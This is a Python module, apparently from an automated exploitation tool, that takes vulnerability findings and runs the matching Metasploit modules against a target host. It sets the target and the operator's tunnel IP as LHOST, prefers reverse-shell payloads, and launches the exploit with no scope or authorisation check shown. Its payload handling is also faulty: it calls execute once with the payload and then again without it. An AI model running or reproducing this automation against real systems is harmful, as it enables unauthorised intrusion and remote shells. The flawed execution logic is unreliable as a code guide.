from __future__ import annotations
import asyncio
from typing import Optional

from core.logger import log
from core.state import Finding, Target
from wrappers.msf import MetasploitTool


class MSFExecutor:
    def __init__(self, cfg):
        self.cfg = cfg

    async def run(self, finding: Finding, target: Target, state) -> bool:
        if not finding.msf_module:
            return False
        msf = MetasploitTool(self.cfg)
        if not await msf.connect():
            log.warning("MSF RPC unavailable")
            return False

        parts = finding.msf_module.split("/")
        if len(parts) < 2:
            return False
        mtype, mname = parts[0], "/".join(parts[1:])
        try:
            module = msf.client.modules.use(mtype, mname)
        except Exception as e:
            log.warning(f"load {finding.msf_module}: {e}")
            return False

        self._configure(module, target, state)
        payload = self._payload_for(module)
        if payload:
            try:
                module.execute(payload=payload)
            except Exception as e:
                log.debug(f"payload set failed: {e}")

        log.info(f"Executing {finding.msf_module}")
        try:
            job = module.execute()
        except Exception as e:
            log.warning(f"execute failed: {e}")
            return False

        job_id = job.get("job_id") if isinstance(job, dict) else None
        log.info(f"MSF job {job_id} started")
        await asyncio.sleep(15)
        return True

    def _configure(self, module, target: Target, state) -> None:
        opts = {
            "RHOSTS": target.host,
            "RHOST": target.host,
            "RPORT": target.port or 80,
        }
        lhost = self._detect_lhost()
        if lhost:
            opts["LHOST"] = lhost
            opts["LPORT"] = self.cfg.get("shell", "lport_start", default=4444)

        for svc in state.services:
            if svc.port in (80, 443):
                opts.setdefault("RPORT", svc.port)
                opts.setdefault("TARGETURI", "/")
                opts.setdefault("SSL", svc.port == 443)

        for k, v in opts.items():
            try:
                if k in module.options:
                    module[k] = v
            except Exception:
                pass

    def _payload_for(self, module) -> Optional[str]:
        payloads = getattr(module, "targetpayloads", None)
        if payloads and isinstance(payloads, list):
            for p in payloads:
                if "reverse" in p and ("linux" in p or "unix" in p):
                    return p
            for p in payloads:
                if "reverse" in p:
                    return p
        return None

    def _detect_lhost(self) -> Optional[str]:
        from utils.net_utils import detect_tun_ip
        return detect_tun_ip()
